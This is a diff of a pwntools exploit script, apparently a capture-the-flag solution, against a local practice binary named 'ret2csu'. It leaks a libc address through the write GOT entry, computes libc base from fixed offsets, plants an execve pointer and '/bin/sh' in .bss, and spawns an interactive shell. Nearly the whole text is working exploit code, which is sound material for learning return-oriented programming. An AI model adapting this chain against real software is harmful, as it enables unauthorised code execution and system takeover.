@@ -1,5 +1,4 @@
 from pwn import*
-import os
 io=process('./ret2csu')
 context.log_level='debug'
 elf=ELF('./ret2csu')
@@ -15,21 +14,19 @@ def csu(r12,r13,r14,r15,last):
 	sleep(1)
 	
 io.recvuntil("Hello, World\n")
+
 csu(write_got,1,write_got,8,main)
 write_real=u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
 print(hex(write_real))
 base=write_real-0x0f7af0
 print(hex(base))
+
 system=base+0x04c920
 exceve=0x0d4060+base
 bss=0x601028
 csu(read_got,0,bss,18,main)
 io.recvuntil("Hello, World\n")
 
-
-os.execve("/bin/sh", ["/bin/sh"], os.environ)
-
-# io.sendline(p64(exceve)+b'/bin/sh\x00')
-# csu(bss,bss+8,0,0,main)
-# io.recvuntil("Hello, World\n")  # 确保程序还活着
-# io.interactive()
+io.sendline(p64(exceve)+b'/bin/sh\x00')
+csu(bss,bss+8,0,0,main)
+io.interactive()
